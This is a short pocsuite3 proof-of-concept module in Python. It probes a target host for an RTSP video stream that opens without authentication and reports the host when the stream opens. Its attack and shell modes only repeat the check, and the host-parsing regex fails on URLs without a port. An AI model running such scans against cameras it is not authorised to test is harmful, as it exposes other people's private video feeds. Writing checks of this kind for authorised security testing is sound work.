#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
import cv2
import base64
import os
import random
import re
from urllib.parse import urljoin, urlparse
import hashlib
minimum_version_required('1.9.11')


class DemoPOC(POCBase):
    vulID = '0'




    # 打印结果
    def _verify(self):
        Host = (re.search('([\w-]+\.)+\w{1,3}(:\d{1,5})', self.url)).group(0)
        rtsp_url = f"rtsp://{Host}/stream"
        cap = cv2.VideoCapture(rtsp_url)
        # 检查视频捕获对象是否成功打开
        if not cap.isOpened():
            print("RTSP视频流无法打开")
        else:
            print("RTSP视频流已经打开")
            # 释放视频捕获对象
            cap.release()
            result = {'VerifyInfo': {'URL': Host}}
            return self.parse_output(result)
            # video.release()

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
